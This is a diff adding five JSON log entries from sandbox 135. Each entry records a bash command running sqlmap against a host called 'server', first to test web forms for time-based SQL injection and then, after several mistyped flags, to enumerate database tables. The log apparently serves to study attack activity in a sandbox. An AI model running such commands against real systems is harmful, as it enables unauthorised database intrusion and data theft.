@@ -1,0 +1,5 @@
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T09:42:50.892Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T09:46:30.464Z", "cmd_type": "bash-command", "cmd": "sqlmap -a http://server/ --forms --test-filter=SLEEP"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T09:47:23.365Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -table"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T09:47:45.040Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP --table"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T09:47:50.146Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP --tables"}
